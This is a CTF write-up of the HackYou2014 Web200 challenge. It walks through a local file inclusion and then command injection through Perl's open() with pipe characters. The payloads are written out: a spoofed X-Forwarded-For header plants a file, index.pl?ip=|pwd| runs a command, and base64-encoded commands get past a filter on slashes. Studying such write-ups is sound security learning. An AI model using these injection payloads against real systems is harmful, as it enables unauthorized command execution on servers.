+++
author = "pwntester"
categories = ["CTF", "Web", "PHP", "HackYou2014"]
date = 2014-01-15T22:35:00Z
description = ""
draft = false
slug = "hackyou2014-web200-write-up"
tags = ["CTF", "Web", "PHP", "HackYou2014"]
title = "#hackyou2014 Web200 write-up"

+++

In this [level](http://hackyou2014tasks.ctf.su:20080/) we are presented with a typical Snake game.

![](/images/octopress/snake.png)

I spent a couple of hours deofuscating the javascript code until I was capable of submitting any score. Nice but useless. I also found out that I could fake the IP associated to the score using the **X-Forwarded-For** header.
That was pretty much it until the CTF was about to finish when I was given the hint: "../". I could use it to locate a LFI vulnerability that was affecting the **index.php?ip** parameter so I was capable of reading **index.pl**:

![](/images/octopress/indexpl.png)

Reviewing the code we spot the LFI in line 4:

```lang-bash line-numbers 
$login = $session->param('login');
print $req->p('Hello, '.$login.'!');
if ($req->param('ip')) {
    $file = './data/'.MD5($login)."/".$req->param('ip');
    if (-e $file) {
        open FILE, $file;
        $html = '';
        while (<FILE>) {
            $html .= $_;
        }
        close(FILE);
        print $req->start_table({border=>1});
        print $req->Tr($req->th(['Date', 'Score']));
        print $html;
        print $req->end_table();
        print $req->a({href=>'index.pl'}, 'Back');
    } else {
        print $req->h1('Error');
    }
}
```

But also there is another interesting "feature" if $file exists then it will be opened and since perl **open()** command in line 6 allow us to inject commands using pipes, we can execute any arbitrary command. Problem is that $file needs to exist so how can we create a random file there? Well, we can use our ability to submit random IPs with **X-Forwarded-For**:

![](/images/octopress/web200-1.png)

Now if we go to index.pl?ip=|pwd| we will get:

![](/images/octopress/web200-2.png)

Nice! However we cannot create files containing a slash ("/"):

```lang-bash line-numbers 
fusion@fusion:~/test$ perl -e 'open(FILE, ">>", "./"."|pwd|")'
fusion@fusion:~/test$ perl -e 'open(FILE, ">>", "./"."|ls .|")'
fusion@fusion:~/test$ perl -e 'open(FILE, ">>", "./"."|ls ..|")'
fusion@fusion:~/test$ perl -e 'open(FILE, ">>", "./"."|ls /|")'
fusion@fusion:~/test$ ls
|ls ..|  |ls .|  |pwd|
```

No backslashes neither:


```lang-bash line-numbers 
fusion@fusion:~/test$ perl -e 'open(FILE, ">>", "./"."|`echo -e '\x6c\x73\x20\x2f'`|")'
fusion@fusion:~/test$ ls
|`echo -e x6cx73x20x2f`|  |ls ..|  |ls .|  |pwd|
```

Lets try base64:

```lang-bash line-numbers 
fusion@fusion:~/test$ perl -e 'open(FILE, ">>", "./"."|`echo bHMgLw== | base64 -d`|")'
fusion@fusion:~/test$ ls
|`echo -e x6cx73x20x2f`|  |`echo bHMgLw== | base64 -d`|  |ls ..|  |ls .|  |pwd|
```

Cool! lets submit it:

![](/images/octopress/web200-3.png)

And fetch our recompense:

![](/images/octopress/web200-4.png)




